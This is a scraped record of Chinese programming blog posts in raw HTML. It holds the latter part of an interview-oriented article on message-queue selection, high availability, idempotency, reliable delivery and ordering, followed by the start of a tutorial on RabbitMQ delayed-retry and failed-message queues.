id=\"crayon-5b4a822d1bd83649830686-5\">省略以下记录</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd83649830686-6\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>我们可以看出，RabbitMQ版本发布比ActiveMq频繁很多。至于RocketMQ和kafka就不带大家看了，总之也比ActiveMQ活跃的多。详情，可自行查阅。<br>\n再来一个性能对比表</p>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>ActiveMQ</th>\n<th>RabbitMQ</th>\n<th>RocketMQ</th>\n<th>kafka</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>开发语言</td>\n<td>java</td>\n<td>erlang</td>\n<td>java</td>\n<td>scala</td>\n</tr>\n<tr>\n<td>单机吞吐量</td>\n<td>万级</td>\n<td>万级</td>\n<td>10万级</td>\n<td>10万级</td>\n</tr>\n<tr>\n<td>时效性</td>\n<td>ms级</td>\n<td>us级</td>\n<td>ms级</td>\n<td>ms级以内</td>\n</tr>\n<tr>\n<td>可用性</td>\n<td>高(主从架构)</td>\n<td>高(主从架构)</td>\n<td>非常高(分布式架构)</td>\n<td>非常高(分布式架构)</td>\n</tr>\n<tr>\n<td>功能特性</td>\n<td>成熟的产品，在很多公司得到应用；有较多的文档；各种协议支持较好</td>\n<td>基于erlang开发，所以并发能力很强，性能极其好，延时很低;管理界面较丰富</td>\n<td>MQ功能比较完备，扩展性佳</td>\n<td>只支持主要的MQ功能，像一些消息查询，消息回溯等功能没有提供，毕竟是为大数据准备的，在大数据领域应用广。</td>\n</tr>\n</tbody>\n</table>\n<p>综合上面的材料得出以下两点:<br>\n(1)中小型软件公司，建议选RabbitMQ.一方面，erlang语言天生具备高并发的特性，而且他的管理界面用起来十分方便。正所谓，成也萧何，败也萧何！他的弊端也在这里，虽然RabbitMQ是开源的，然而国内有几个能定制化开发erlang的程序员呢？所幸，RabbitMQ的社区十分活跃，可以解决开发过程中遇到的bug，这点对于中小型公司来说十分重要。不考虑rocketmq和kafka的原因是，一方面中小型软件公司不如互联网公司，数据量没那么大，选消息中间件，应首选功能比较完备的，所以kafka排除。不考虑rocketmq的原因是，rocketmq是阿里出品，如果阿里放弃维护rocketmq，中小型公司一般抽不出人来进行rocketmq的定制化开发，因此不推荐。<br>\n(2)大型软件公司，根据具体使用在rocketMq和kafka之间二选一。一方面，大型软件公司，具备足够的资金搭建分布式环境，也具备足够大的数据量。针对rocketMQ,大型软件公司也可以抽出人手对rocketMQ进行定制化开发，毕竟国内有能力改JAVA源码的人，还是相当多的。至于kafka，根据业务场景选择，如果有日志采集功能，肯定是首选kafka了。具体该选哪个，看使用场景。</p>\n<h3 id=\"如何保证消息队列是高可用的\">4、如何保证消息队列是高可用的？</h3>\n<p><strong>分析</strong>:在第二点说过了，引入消息队列后，系统的可用性下降。在生产中，没人使用单机模式的消息队列。因此，作为一个合格的程序员，应该对消息队列的高可用有很深刻的了解。如果面试的时候，面试官问，你们的消息中间件如何保证高可用的？你的回答只是表明自己只会订阅和发布消息，面试官就会怀疑你是不是只是自己搭着玩，压根没在生产用过。<strong>请做一个爱思考，会思考，懂思考的程序员。</strong><br>\n<strong>回答</strong>:这问题，其实要对消息队列的集群模式要有深刻了解，才好回答。<br>\n以rcoketMQ为例，他的集群就有多master 模式、多master多slave异步复制模式、多 master多slave同步双写模式。多master多slave模式部署架构图(网上找的,偷个懒，懒得画):<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/b80ee0d20718dbdd97cf522295312787.png\" alt=\"image\"><br>\n其实博主第一眼看到这个图，就觉得和kafka好像，只是NameServer集群，在kafka中是用zookeeper代替，都是用来保存和发现master和slave用的。通信过程如下:<br>\nProducer 与 NameServer集群中的其中一个节点（随机选择）建立长连接，定期从 NameServer 获取 Topic 路由信息，并向提供 Topic 服务的 Broker Master 建立长连接，且定时向 Broker 发送心跳。Producer 只能将消息发送到 Broker master，但是 Consumer 则不一样，它同时和提供 Topic 服务的 Master 和 Slave建立长连接，既可以从 Broker Master 订阅消息，也可以从 Broker Slave 订阅消息。<br>\n那么kafka呢,为了对比说明直接上kafka的拓补架构图(也是找的，懒得画)<br>\n<img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/7a938865203b9c2ff91a37429991b9a6.png\" alt=\"image\"><br>\n如上图所示，一个典型的Kafka集群中包含若干Producer（可以是web前端产生的Page View，或者是服务器日志，系统CPU、Memory等），若干broker（Kafka支持水平扩展，一般broker数量越多，集群吞吐率越高），若干Consumer Group，以及一个Zookeeper集群。Kafka通过Zookeeper管理集群配置，选举leader，以及在Consumer Group发生变化时进行rebalance。Producer使用push模式将消息发布到broker，Consumer使用pull模式从broker订阅并消费消息。<br>\n至于rabbitMQ,也有普通集群和镜像集群模式，自行去了解，比较简单，两小时即懂。<br>\n要求，在回答高可用的问题时，应该能逻辑清晰的画出自己的MQ集群架构或清晰的叙述出来。</p>\n<h3 id=\"如何保证消息不被重复消费\">5、如何保证消息不被重复消费？</h3>\n<p><strong>分析</strong>:这个问题其实换一种问法就是，如何保证消息队列的幂等性?这个问题可以认为是消息队列领域的基本问题。换句话来说，是在考察你的设计能力，这个问题的回答可以根据具体的业务场景来答，没有固定的答案。<br>\n<strong>回答</strong>:先来说一下为什么会造成重复消费?<br>\n其实无论是那种消息队列，造成重复消费原因其实都是类似的。正常情况下，消费者在消费消息时候，消费完毕后，会发送一个确认信息给消息队列，消息队列就知道该消息被消费了，就会将该消息从消息队列中删除。只是不同的消息队列发送的确认信息形式不同,例如RabbitMQ是发送一个ACK确认消息，RocketMQ是返回一个CONSUME_SUCCESS成功标志，kafka实际上有个offset的概念，简单说一下(如果还不懂，出门找一个kafka入门到精通教程),就是每一个消息都有一个offset，kafka消费过消息后，需要提交offset，让消息队列知道自己已经消费过了。那造成重复消费的原因?，就是因为网络传输等等故障，确认信息没有传送到消息队列，导致消息队列不知道自己已经消费过该消息了，再次将该消息分发给其他的消费者。<br>\n如何解决?这个问题针对业务场景来答分以下几点<br>\n(1)比如，你拿到这个消息做数据库的insert操作。那就容易了，给这个消息做一个唯一主键，那么就算出现重复消费的情况，就会导致主键冲突，避免数据库出现脏数据。<br>\n(2)再比如，你拿到这个消息做redis的set的操作，那就容易了，不用解决，因为你无论set几次结果都是一样的，set操作本来就算幂等操作。<br>\n(3)如果上面两种情况还不行，上大招。准备一个第三方介质,来做消费记录。以redis为例，给消息分配一个全局id，只要消费过该消息，将&lt;id,message&gt;以K-V形式写入redis。那消费者开始消费前，先去redis中查询有没消费记录即可。</p>\n<h3 id=\"如何保证消费的可靠性传输\">6、如何保证消费的可靠性传输?</h3>\n<p><strong>分析</strong>:我们在使用消息队列的过程中，应该做到消息不能多消费，也不能少消费。如果无法做到可靠性传输，可能给公司带来千万级别的财产损失。同样的，如果可靠性传输在使用过程中，没有考虑到，这不是给公司挖坑么，你可以拍拍屁股走了，公司损失的钱，谁承担。还是那句话，<strong>认真对待每一个项目，不要给公司挖坑。</strong><br>\n<strong>回答</strong>:其实这个可靠性传输，每种MQ都要从三个角度来分析:生产者弄丢数据、消息队列弄丢数据、消费者弄丢数据</p>\n<h4 id=\"rabbitmq\">RabbitMQ</h4>\n<p><strong>(1)生产者丢数据</strong><br>\n从生产者弄丢数据这个角度来看，RabbitMQ提供transaction和confirm模式来确保生产者不丢消息。<br>\ntransaction机制就是说，发送消息前，开启事物(channel.txSelect())，然后发送消息，如果发送过程中出现什么异常，事物就会回滚(channel.txRollback())，如果发送成功则提交事物(channel.txCommit())。<br>\n然而缺点就是吞吐量下降了。因此，按照博主的经验，生产上用confirm模式的居多。一旦channel进入confirm模式，所有在该信道上面发布的消息都将会被指派一个唯一的ID(从1开始)，一旦消息被投递到所有匹配的队列之后，rabbitMQ就会发送一个Ack给生产者(包含消息的唯一ID)，这就使得生产者知道消息已经正确到达目的队列了.如果rabiitMQ没能处理该消息，则会发送一个Nack消息给你，你可以进行重试操作。处理Ack和Nack的代码如下所示（说好不上代码的，偷偷上了）:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a822d1bd8d703994886\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nchannel.addConfirmListener(new ConfirmListener() {  \r\n                &lt;a href=\"http://www.jobbole.com/members/wx610506454\"&gt;@Override&lt;/a&gt;  \r\n                public void handleNack(long deliveryTag, boolean multiple) throws IOException {  \r\n                    System.out.println(\"nack: deliveryTag = \"+deliveryTag+\" multiple: \"+multiple);  \r\n                }  \r\n                &lt;a href=\"http://www.jobbole.com/members/wx610506454\"&gt;@Override&lt;/a&gt;  \r\n                public void handleAck(long deliveryTag, boolean multiple) throws IOException {  \r\n                    System.out.println(\"ack: deliveryTag = \"+deliveryTag+\" multiple: \"+multiple);  \r\n                }  \r\n            });  </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd8d703994886-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd8d703994886-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd8d703994886-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd8d703994886-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd8d703994886-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd8d703994886-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd8d703994886-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd8d703994886-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a822d1bd8d703994886-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a822d1bd8d703994886-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd8d703994886-1\"><span class=\"crayon-v\">channel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">addConfirmListener</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ConfirmListener</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd8d703994886-2\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"http://www.jobbole.com/members/wx610506454\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd8d703994886-3\"><span class=\"crayon-h\">                </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">handleNack</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">deliveryTag</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">multiple</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IOException</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd8d703994886-4\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"nack: deliveryTag = \"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">deliveryTag</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\" multiple: \"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">multiple</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd8d703994886-5\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd8d703994886-6\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">\"http://www.jobbole.com/members/wx610506454\"</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd8d703994886-7\"><span class=\"crayon-h\">                </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">handleAck</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">deliveryTag</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">multiple</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IOException</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd8d703994886-8\"><span class=\"crayon-h\">                    </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"ack: deliveryTag = \"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">deliveryTag</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\" multiple: \"</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">multiple</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4a822d1bd8d703994886-9\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a822d1bd8d703994886-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0130 seconds] -->\r\n<p><strong>(2)消息队列丢数据</strong><br>\n处理消息队列丢数据的情况，一般是开启持久化磁盘的配置。这个持久化配置可以和confirm机制配合使用，你可以在消息持久化磁盘后，再给生产者发送一个Ack信号。这样，如果消息持久化磁盘之前，rabbitMQ阵亡了，那么生产者收不到Ack信号，生产者会自动重发。<br>\n那么如何持久化呢，这里顺便说一下吧，其实也很容易，就下面两步<br>\n1、将queue的持久化标识durable设置为true,则代表是一个持久的队列<br>\n2、发送消息的时候将deliveryMode=2<br>\n这样设置以后，rabbitMQ就算挂了，重启后也能恢复数据<br>\n<strong>(3)消费者丢数据</strong><br>\n消费者丢数据一般是因为采用了自动确认消息模式。这种模式下，消费者会自动确认收到信息。这时rahbitMQ会立即将消息删除，这种情况下如果消费者出现异常而没能处理该消息，就会丢失该消息。<br>\n至于解决方案，采用手动确认消息即可。</p>\n<h4 id=\"kafka\">kafka</h4>\n<p>这里先引一张kafka Replication的<a href=\"http://www.infoq.com/cn/articles/kafka-analysis-part-2/\">数据流向图</a><br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/aa0ea1ebe9e63e04c033e8544bf8e944.png\" alt=\"image\"><br>\nProducer在发布消息到某个Partition时，先通过ZooKeeper找到该Partition的Leader，然后无论该Topic的Replication Factor为多少（也即该Partition有多少个Replica），Producer只将该消息发送到该Partition的Leader。Leader会将该消息写入其本地Log。每个Follower都从Leader中pull数据。<br>\n针对上述情况，得出如下分析<br>\n<strong>(1)生产者丢数据</strong><br>\n在kafka生产中，基本都有一个leader和多个follwer。follwer会去同步leader的信息。因此，为了避免生产者丢数据，做如下两点配置</p>\n<ol>\n<li>第一个配置要在producer端设置acks=all。这个配置保证了，follwer同步完成后，才认为消息发送成功。</li>\n<li>在producer端设置retries=MAX，一旦写入失败，这无限重试</li>\n</ol>\n<p><strong>(2)消息队列丢数据</strong><br>\n针对消息队列丢数据的情况，无外乎就是，数据还没同步，leader就挂了，这时zookpeer会将其他的follwer切换为leader,那数据就丢失了。针对这种情况，应该做两个配置。</p>\n<ol>\n<li>replication.factor参数，这个值必须大于1，即要求每个partition必须有至少2个副本</li>\n<li>min.insync.replicas参数，这个值必须大于1，这个是要求一个leader至少感知到有至少一个follower还跟自己保持联系</li>\n</ol>\n<p>这两个配置加上上面生产者的配置联合起来用，基本可确保kafka不丢数据</p>\n<p><strong>(3)消费者丢数据</strong><br>\n这种情况一般是自动提交了offset，然后你处理程序过程中挂了。kafka以为你处理好了。再强调一次offset是干嘛的<br>\n<strong>offset</strong>：指的是kafka的topic中的每个消费组消费的下标。简单的来说就是一条消息对应一个offset下标，每次消费数据的时候如果提交offset，那么下次消费就会从提交的offset加一那里开始消费。<br>\n比如一个topic中有100条数据，我消费了50条并且提交了，那么此时的kafka服务端记录提交的offset就是49(offset从0开始)，那么下次消费的时候offset就从50开始消费。<br>\n解决方案也很简单，改成手动提交即可。</p>\n<h4 id=\"activemq和rocketmq\">ActiveMQ和RocketMQ</h4>\n<p>大家自行查阅吧</p>\n<h3 id=\"如何保证消息的顺序性\">7、如何保证消息的顺序性？</h3>\n<p><strong>分析</strong>:其实并非所有的公司都有这种业务需求，但是还是对这个问题要有所复习。<br>\n<strong>回答</strong>:针对这个问题，通过某种算法，将需要保持先后顺序的消息放到同一个消息队列中(kafka中就是partition,rabbitMq中就是queue)。然后只用一个消费者去消费该队列。<br>\n有的人会问:那如果为了吞吐量，有多个消费者去消费怎么办？<br>\n这个问题，没有固定回答的套路。比如我们有一个微博的操作，发微博、写评论、删除微博，这三个异步操作。如果是这样一个业务场景，那只要重试就行。比如你一个消费者先执行了写评论的操作，但是这时候，微博都还没发，写评论一定是失败的，等一段时间。等另一个消费者，先执行写评论的操作后，再执行，就可以成功。<br>\n总之，针对这个问题，我的观点是保证入队有序就行，出队以后的顺序交给消费者自己去保证，没有固定套路。</p>\n<h2 id=\"总结\">总结</h2>\n<p>写到这里，希望读者把本文提出的这几个问题，经过深刻的准备后，一般来说，能囊括大部分的消息队列的知识点。如果面试官不问这几个问题怎么办，简单，自己把几个问题讲清楚，突出以下自己考虑的全面性。<br>\n最后，其实我不太提倡这样突击复习，希望大家打好基本功，<strong>做一个爱思考，懂思考，会思考的程序员</strong>。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114016\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114016votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114016\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,分布式,数据库", "url": "http://blog.jobbole.com/114016/", "url_obj_id": "1b36123333a36dfc38deb859d6cb3ce6"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/11/a099bdc26462540c4ca8ac310b8a24b8.png"], "title": "RabbitMQ 发布订阅实战：实现延时重试队列", "create_date": "2018/06/15 ·", "praise_num": 1, "fav_num": 0, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/mylxsw\">管宜尧</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>RabbitMQ是一款使用Erlang开发的开源消息队列。本文假设读者对RabbitMQ是什么已经有了基本的了解，如果你还不知道它是什么以及可以用来做什么，建议先从官网的 <a href=\"http://www.rabbitmq.com/getstarted.html\" rel=\"nofollow noreferrer\">RabbitMQ Tutorials</a> 入门教程开始学习。</p>\n<p>本文将会讲解如何使用RabbitMQ实现延时重试和失败消息队列，实现可靠的消息消费，消费失败后，自动延时将消息重新投递，当达到一定的重试次数后，将消息投递到失败消息队列，等待人工介入处理。在这里我会带领大家一步一步的实现一个带有失败重试功能的发布订阅组件，使用该组件后可以非常简单的实现消息的发布订阅，在进行业务开发的时候，业务开发人员可以将主要精力放在业务逻辑实现上，而不需要花费时间去理解RabbitMQ的一些复杂概念。</p>\n<h2>概要</h2>\n<p>我们将会实现如下功能</p>\n<ul>\n<li>结合RabbitMQ的Topic模式和Work Queue模式实现生产方产生消息，消费方按需订阅，消息投递到消费方的队列之后，多个worker同时对消息进行消费</li>\n<li>结合RabbitMQ的 <a href=\"http://www.rabbitmq.com/ttl.html\" rel=\"nofollow noreferrer\">Message TTL</a> 和 <a href=\"http://www.rabbitmq.com/dlx.html\" rel=\"nofollow noreferrer\">Dead Letter Exchange</a> 实现消息的延时重试功能</li>\n<li>消息达到最大重试次数之后，将其投递到失败队列，等待人工介入处理bug后，重新将其加入队列消费</li>\n</ul>\n<p>具体流程见下图</p>\n<p><img title=\"xxx\" src=\"https://segmentfault.com/img/remote/1460000014847793?w=809&amp;h=926\" alt=\"xxx\"></p>\n<ol>\n<li>生产者发布消息到主Exchange</li>\n<li>主Exchange根据Routing Key将消息分发到对应的消息队列</li>\n<li>多个消费者的worker进程同时对队列中的消息进行消费，因此它们之间采用“竞争”的方式来争取消息的消费</li>\n<li>消息消费后，不管成功失败，都要返回ACK消费确认消息给队列，避免消息消费确认机制导致重复投递，同时，如果消息处理成功，则结束流程，否则进入重试阶段</li>\n<li>如果重试次数小于设定的最大重试次数（3次），则将消息重新投递到Retry Exchange的重试队列</li>\n<li>重试队列不需要消费者直接订阅，它会等待消息的有效时间过期之后，重新将消息投递给Dead Letter Exchange，我们在这里将其设置为主Exchange，实现延时后重新投递消息，这样消费者就可以重新消费消息</li>\n<li>如果三次以上都是消费失败，则认为消息无法被处理，直接将消息投递给Failed Exchange的Failed Queue，这时候应用可以触发报警机制，以通知相关责任人处理</li>\n<li>等待人工介入处理（解决bug）之后，重新将消息投递到主Exchange，这样就可以重新消费了</li>\n</ol>\n<h2>技术实现</h2>\n<p><a href=\"https://en.wikiquote.org/wiki/Linus_Torvalds\" rel=\"nofollow noreferrer\">Linus Torvalds</a> 曾经说过</p>\n<blockquote><p>Talk is cheap. Show me the code</p></blockquote>\n<p>我分别用Java和PHP实现了本文所讲述的方案，读者可以通过参考代码以及本文中的基本步骤来更好的理解</p>\n<ul>\n<li><a href=\"https://github.com/mylxsw/rabbitmq-pubsub-php\" rel=\"nofollow noreferrer\">rabbitmq-pubsub-php</a></li>\n<li><a href=\"https://github.com/mylxsw/rabbitmq-pubsub-java\" rel=\"nofollow noreferrer\">rabbitmq-pubsub-java</a></li>\n</ul>\n<h3>创建Exchange</h3>\n<p>为了实现消息的延时重试和失败存储，我们需要创建三个Exchange来处理消息。</p>\n<ul>\n<li><strong>master</strong> 主Exchange，发布消息时发布到该Exchange</li>\n<li><strong>master.retry</strong> 重试Exchange，消息处理失败时（3次以内），将消息重新投递给该Exchange</li>\n<li><strong>master.failed</strong> 失败Exchange，超过三次重试失败后，消息投递到该Exchange</li>\n</ul>\n<p>所有的Exchange声明(declare)必须使用以下参数</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>exchange</td>\n<td>–</td>\n<td>Exchange名称</td>\n</tr>\n<tr>\n<td>type</td>\n<td>topic</td>\n<td>Exchange 类型</td>\n</tr>\n<tr>\n<td>passive</td>\n<td>false</td>\n<td>如果Exchange已经存在，则返回成功，不存在则创建</td>\n</tr>\n<tr>\n<td>durable</td>\n<td>true</td>\n<td>持久化存储Exchange，这里仅仅是Exchange本身持久化，消息和队列需要单独指定其持久化</td>\n</tr>\n<tr>\n<td>no-wait</td>\n<td>false</td>\n<td>该方法需要应答确认</td>\n</tr>\n</tbody>\n</table>\n<p>Java代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92eca6e6731656695\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" 